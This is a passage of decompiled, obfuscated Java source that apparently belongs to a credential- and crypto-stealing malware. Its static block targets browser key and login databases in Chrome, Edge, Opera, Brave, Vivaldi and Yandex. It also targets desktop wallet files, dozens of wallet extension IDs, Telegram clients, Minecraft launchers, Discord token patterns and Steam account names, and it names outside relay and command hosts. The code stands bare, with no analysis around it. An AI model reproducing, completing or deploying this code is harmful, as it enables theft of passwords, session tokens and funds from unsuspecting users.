      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 == 332) {
         return "x86";
      } else if (var0 == (0 << 16 | (char)-31132)) {
         return "x64";
      } else {
         return var0 == (0 << 16 | (char)-21916)
            ? "arm64"
            : "unknown";
      }
   }

   static {
      String var0 = System.getenv("COMPUTERNAME");
      potato = new StringBuilder().append(sparrow).append("@").append(var0).toString();

      try {
         cobalt = String.valueOf(java.nio.file.Files.createTempDirectory("TempGui", new FileAttribute[0]));
         lantern = new StringBuilder().append(cobalt).append(lumber).toString();
         pebble = new File(System.getenv("APPDATA"));
         lupine = new File(System.getenv("LOCALAPPDATA"));
      } catch (IOException var3) {
         throw new java.lang.RuntimeException(var3);
      }

      stealth = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Google\\Chrome\\User Data\\Local State").toString());
      pumpkin = new File(new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera GX Stable\\Local State").toString());
      pulley = new File(new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera Stable\\Local State").toString());
      hermit = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Microsoft\\Edge\\User Data\\Local State").toString());
      receipt = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\BraveSoftware\\Brave-Browser\\User Data\\Local State").toString());
      dolphin = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Vivaldi\\User Data\\Local State").toString());
      rook = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Yandex\\YandexBrowser\\User Data\\Local State").toString());
      jungle = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Google\\Chrome\\User Data\\Local State").toString();
      coffee = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Google\\Chrome\\User Data").toString();
      castle = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Yandex\\YandexBrowser\\User Data\\Local State").toString();
      motif = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Yandex\\YandexBrowser\\User Data").toString();
      cedar = new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera GX Stable\\Local State").toString();
      ledger = new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera GX Stable").toString();
      hamlet = new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera Stable\\Local State").toString();
      shrub = new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera Stable").toString();
      lagoon = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Microsoft\\Edge\\User Data\\Local State").toString();
      bottle = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Microsoft\\Edge\\User Data").toString();
      rosemary = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\BraveSoftware\\Brave-Browser\\User Data\\Local State").toString();
      mandala = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\BraveSoftware\\Brave-Browser\\User Data").toString();
      pancake = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Vivaldi\\User Data\\Local State").toString();
      puffin = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Vivaldi\\User Data").toString();
      modern = java.nio.file.Paths.get(new StringBuilder().append(lantern).append("\\Cookies").toString(), new String[0]);
      sloth = java.nio.file.Paths.get(new StringBuilder().append(lantern).append("\\History").toString(), new String[0]);
      paprika = new StringBuilder().append(lantern).append("\\Minecraft").toString();
      mimic = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Google\\Chrome\\User Data\\Local State").toString());
      carpet = new File(new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera GX Stable\\Local State").toString());
      mantis = new File(new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera Stable\\Local State").toString());
      bullet = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Microsoft\\Edge\\User Data\\Local State").toString());
      olive = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\BraveSoftware\\Brave-Browser\\User Data\\Local State").toString());
      helmet = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Vivaldi\\User Data\\Local State").toString());
      nectar = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Google\\Chrome\\User Data\\Local State").toString();
      satchel = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Google\\Chrome\\User Data\\Default\\Login Data").toString();
      plato = new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera GX Stable\\Local State").toString();
      fossil = new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera GX Stable\\Login Data").toString();
      shrimp = new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera Stable\\Local State").toString();
      rapids = new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera Stable\\Default\\Login Data").toString();
      harbor = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Microsoft\\Edge\\User Data\\Local State").toString();
      pelican = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Microsoft\\Edge\\User Data\\Default\\Login Data").toString();
      rosin = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\BraveSoftware\\Brave-Browser\\User Data\\Local State").toString();
      squid = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data").toString();
      mitten = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Vivaldi\\User Data\\Local State").toString();
      ladder = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Vivaldi\\User Data\\Default\\Login Data").toString();
      hornet = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Google\\Chrome\\User Data\\Local State").toString());
      hammer = new File(new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera GX Stable\\Local State").toString());
      pollen = new File(new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera Stable\\Local State").toString());
      silver = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Microsoft\\Edge\\User Data\\Local State").toString());
      granite = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\BraveSoftware\\Brave-Browser\\User Data\\Local State").toString());
      phoenix = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Vivaldi\\User Data\\Local State").toString());
      midnight = new File(new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Yandex\\YandexBrowser\\User Data\\Local State").toString());
      pilot = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Google\\Chrome\\User Data\\Local State").toString();
      nourish = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Google\\Chrome\\User Data").toString();
      kimono = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Yandex\\YandexBrowser\\User Data\\Local State").toString();
      paddle = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Yandex\\YandexBrowser\\User Data").toString();
      jasmine = new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera GX Stable\\Local State").toString();
      ninja = new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera GX Stable").toString();
      parcel = new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera Stable\\Local State").toString();
      oregano = new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera Stable").toString();
      bison = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Microsoft\\Edge\\User Data\\Local State").toString();
      chimney = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Microsoft\\Edge\\User Data").toString();
      moonbeam = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\BraveSoftware\\Brave-Browser\\User Data\\Local State").toString();
      nebula = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\BraveSoftware\\Brave-Browser\\User Data").toString();
      serene = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Vivaldi\\User Data\\Local State").toString();
      poplar = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Vivaldi\\User Data").toString();
      pomegranate = new String[]{
         new StringBuilder().append(pebble).append("\\Zcash").toString(),
         new StringBuilder().append(pebble).append("\\Armory").toString(),
         new StringBuilder().append(pebble).append("\\Bytecoin").toString(),
         new StringBuilder().append(pebble).append("\\com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb").toString(),
         new StringBuilder().append(pebble).append("\\Exodus\\exodus.wallet").toString(),
         new StringBuilder().append(pebble).append("\\Ethereum\\keystore").toString(),
         new StringBuilder().append(pebble).append("\\Electrum\\wallets").toString(),
         new StringBuilder().append(pebble).append("\\atomic\\Local Storage\\leveldb").toString(),
         new StringBuilder().append(pebble).append("\\Guarda\\Local Storage\\leveldb").toString(),
         new StringBuilder().append(lupine).append("\\Coinomi\\Coinomi\\wallets").toString()
      };
      maple = new StringBuilder().append(lantern).append("\\Cookies").toString();
      paprika = new StringBuilder().append(lantern).append("\\Minecraft").toString();

      try {
         java.nio.file.Files.createDirectories(java.nio.file.Paths.get(lantern, new String[0]), new FileAttribute[0]);
      } catch (IOException var2) {
         var2.printStackTrace();
      }

      medley = new File(paprika);
      if (!medley.exists()) {
         medley.mkdir();
      }

      reveal.put(coffee, "Chrome");
      reveal.put(shrub, "Opera");
      reveal.put(ledger, "OperaGX");
      reveal.put(bottle, "Edge");
      reveal.put(mandala, "Brave");
      reveal.put(puffin, "Vivaldi");
      reveal.put(motif, "Yandex");
      gypsum = java.util.regex.Pattern.compile("\"cell\":\"([0-9a-fA-F]+)\"");
      shell = new String[]{
         "https://telemetry-relay.kartohaantoha36-6a9.workers.dev"
      };
      quartz = new String[]{
         "https://toncenter.com/api/v2/runGetMethod",
         "https://tonhubapi.com/api/v2/runGetMethod"
      };
      ocean = java.util.regex.Pattern.compile("^[0-9a-fA-F]{16}$");
      mango = new String[]{
         "Telegram.exe",
         "Unigram.exe",
         "Kotatogram.exe",
         "64Gram.exe",
         "Forkgram.exe",
         "AyuGram.exe",
         "iMe.exe",
         "Bettergram.exe"
      };
      field = new String[]{
         "Telegram",
         "Unigram",
         "Kotatogram",
         "64Gram",
         "Forkgram",
         "AyuGram",
         "iMe",
         "Bettergram"
      };
      jewel = new String[]{
         "Telegram",
         "Telegram Desktop",
         "Unigram",
         "Kotatogram",
         "64Gram",
         "Forkgram",
         "AyuGram",
         "iMe",
         "Bettergram"
      };
      fathom = new String[]{
         "AYUGRAM_ROOT",
         "AYUGRAM_PATH",
         "TELEGRAM_ROOT",
         "TELEGRAM_DESKTOP_ROOT",
         "UNIGRAM_ROOT",
         "KOTATOGRAM_ROOT",
         "64GRAM_ROOT",
         "FORKGRAM_ROOT",
         "IME_ROOT",
         "BETTERGRAM_ROOT"
      };
      papaya = new java.lang.ThreadLocal();
      lavender = new JDBC();
      bronze = new Gson();
      sage = new LinkedHashMap<String, String>() {
         {
            this.put(
               "bhghoamapcdpbohphigoooaddinpkbai",
               "Authenticator"
            );
            this.put(
               "fhbohimaelbohpjbbldcngcnapndodjp",
               "Binance"
            );
            this.put(
               "fihkakfobkmkjojpchpfgcmhfjnmnfpi",
               "Bitapp"
            );
            this.put(
               "aodkkagnadcbobfpggfnjeongemjbjca",
               "BoltX"
            );
            this.put(
               "aeachknmefphepccionboohckonoeemg",
               "Coin98"
            );
            this.put(
               "hnfanknocfeofbddgcijnmhnfnkdnaad",
               "Coinbase"
            );
            this.put(
               "agoakfejjabomempkjlepdflaleeobhb",
               "Core"
            );
            this.put(
               "pnlfjmlcjdjgkddecgincndfgegkecke",
               "Crocobit"
            );
            this.put(
               "blnieiiffboillknjnepogjhkgnoapac",
               "Equal"
            );
            this.put(
               "cgeeodpfagjceefieflmdfphplkenlfk",
               "Ever"
            );
            this.put(
               "aholpfdialjgjfhomihkjbmgjidlcdno",
               "ExodusWeb3"
            );
            this.put(
               "ebfidpplhabeedpnhjnobghokpiioolj",
               "Fewcha"
            );
            this.put(
               "cjmkndjhnagcfbpiemnkdpomccnjblmj",
               "Finnie"
            );
            this.put(
               "hpglfhgfnhbgpjdenjgmdgoeiappafln",
               "Guarda"
            );
            this.put(
               "nanjmdknhkinifnkgdcggcfnhdaammmj",
               "Guild"
            );
            this.put(
               "fnnegphlobjdpkhecapkijjdkgcjhkib",
               "HarmonyOutdated"
            );
            this.put(
               "flpiciilemghbmfalicajoolhkkenfel",
               "Iconex"
            );
            this.put(
               "cjelfplplebdjjenllpjcblmjkfcffne",
               "JaxxLiberty"
            );
            this.put(
               "jblndlipeogpafnldhgmapagcccfchpi",
               "Kaikas"
            );
            this.put(
               "pdadjkfkgcafgbceimcpbkalnfnepbnk",
               "KardiaChain"
            );
            this.put(
               "dmkamcknogkgcdfhhbddcghachkejeap",
               "Keplr"
            );
            this.put(
               "kpfopkelmapcoipemfendmdcghnegimn",
               "Liquality"
            );
            this.put(
               "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
               "MEWCX"
            );
            this.put(
               "dngmlblcodfobpdpecaadgfbcggfjfnm",
               "MaiarDEFI"
            );
            this.put(
               "efbglgofoippbgcjepnhiblaibcnclgk",
               "Martian"
            );
            this.put(
               "afbcbjpbpfadlkmhmclhkeeodmamcflc",
               "Math"
            );
            this.put(
               "nkbihfbeogaeaoehlefnkodbefgpgknn",
               "Metamask"
            );
            this.put(
               "ejbalbakoplchlghecdalmeeeajnimhm",
               "Metamask2"
            );
            this.put(
               "fcckkdbjnoikooededlapcalpionmalo",
               "Mobox"
            );
            this.put(
               "lpfcbjknijpeeillifnkikgncikgfhdo",
               "Nami"
            );
            this.put(
               "jbdaocneiiinmjbjlgalhcelgbejmnid",
               "Nifty"
            );
            this.put(
               "fhilaheimglignddkjgofkcbgekhenbh",
               "Oxygen"
            );
            this.put(
               "mgffkfbidihjpoaomajlbgchddlicgpn",
               "PaliWallet"
            );
            this.put(
               "ejjladinnckdgjemekebdpeokbikhfci",
               "Petra"
            );
            this.put(
               "bfnaelmomeimhlpmgjnjophhpkkoljpa",
               "Phantom"
            );
            this.put(
               "phkbamefinggmakgklpkljjmgibohnba",
               "Pontem"
            );
            this.put(
               "fnjhmkhhmkbjkkabndcnnogagogbneec",
               "Ronin"
            );
            this.put(
               "lgmpcpglpngdoalbgeoldeajfclnhafa",
               "Safepal"
            );
            this.put(
               "nkddgncdjgjfcddamfgcmfnlhccnimig",
               "Saturn"
            );
            this.put(
               "pocmplpaccanhmnllbbkpgfliimjljgo",
               "Slope"
            );
            this.put(
               "bhhhlbepdkbapadjdnnojkbgioiodbic",
               "Solfare"
            );
            this.put(
               "fhmfendgdocmcbmfikdcogofphimnkno",
               "Sollet"
            );
            this.put(
               "mfhbebgoclkghebffdldpobeajmbecfk",
               "Starcoin"
            );
            this.put(
               "cmndjbecilbocjfkibfbifhngkdmjgog",
               "Swash"
            );
            this.put(
               "ookjlbkiijinhpmnjffcofjonbfbgaoc",
               "TempleTezos"
            );
            this.put(
               "aiifbnbfobpmeekipheeijimdpnlpgpp",
               "TerraStation"
            );
            this.put(
               "mfgccjchihfkkindfppnaooecgfneiii",
               "Tokenpocket"
            );
            this.put(
               "nphplpgoakhhjchkkhmiggakijnkhfnd",
               "Ton"
            );
            this.put(
               "ibnejdfjmmkpcnlpebklmnkoeoihofec",
               "Tron"
            );
            this.put(
               "egjidjbpglichdcondbcbdnbeeppgdph",
               "TrustWallet"
            );
            this.put(
               "amkmjjmmflddogmhpjloimipbofnfjih",
               "Wombat"
            );
            this.put(
               "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
               "XDEFI"
            );
            this.put(
               "eigblbgjknlfbajkfhopmcojidlgcehm",
               "XMR.PT"
            );
            this.put(
               "bocpokimicclpaiekenaeelehdjllofo",
               "XinPay"
            );
            this.put(
               "ffnbelfdoeiohenkjibnmadjiehjhajb",
               "Yoroi"
            );
            this.put(
               "kncchdigobghenbbaddojjnnaogfppfj",
               "iWallet"
            );
         }
      };
      orient = new StringBuilder().append(System.getProperty("user.home")).append("\\curseforge\\minecraft\\Instances").toString();
      hunter = new StringBuilder().append(System.getProperty("user.home")).append("\\Downloads\\MultiMC").toString();
      signal = new StringBuilder().append(System.getProperty("user.home")).append("\\AppData\\Roaming\\PrismLauncher\\instances").toString();
      pistol = new java.util.HashSet();
      penguin = System.getenv("APPDATA");
      mineral = System.getenv("LOCALAPPDATA");
      rodeo = new java.util.ArrayList();
      portal = new java.util.ArrayList();
      sleigh = new ObjectMapper();
      quail = java.util.regex.Pattern.compile("dQw4w9WgXcQ:[^\"]*");
      salmon = java.util.regex.Pattern.compile("[\\w-]{24,29}\\.[\\w-]{6}\\.[\\w-]{25,110}");
      parachute = java.util.regex.Pattern.compile("\"([a-fA-F0-9]{100,})\"");
      picnic = java.util.regex.Pattern.compile("\"AccountName\"\\s+\"([^\"]+)\"");
      blanket = "https://funrat.co";
      cartoon = new ObjectMapper();
   }
}
